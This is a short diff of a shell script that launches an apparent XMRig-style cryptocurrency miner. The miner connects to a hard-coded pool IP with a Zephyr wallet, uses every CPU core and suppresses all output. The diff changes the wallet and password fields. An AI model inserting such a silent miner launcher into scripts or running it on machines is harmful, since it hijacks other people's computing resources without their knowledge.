@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" -o 104.237.141.187:8087 -u ZEPHYR33pQCdFnekZPPiFHAQSqBQRpWSJEqpDaShG4cQNMgYUFc7oCUXXujj3mw67Aj4j1yFXxnmKPkCRRwPZZeLNRt9VbRUVXo2G.ln177 -p x -a rx/0 -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 104.237.141.187:8087 -u solo:ZEPHYR33pQCdFnekZPPiFHAQSqBQRpWSJEqpDaShG4cQNMgYUFc7oCUXXujj3mw67Aj4j1yFXxnmKPkCRRwPZZeLNRt9VbRUVXo2G -p LNN17AA -a rx/0 -t $(nproc --all) > /dev/null 2>&1
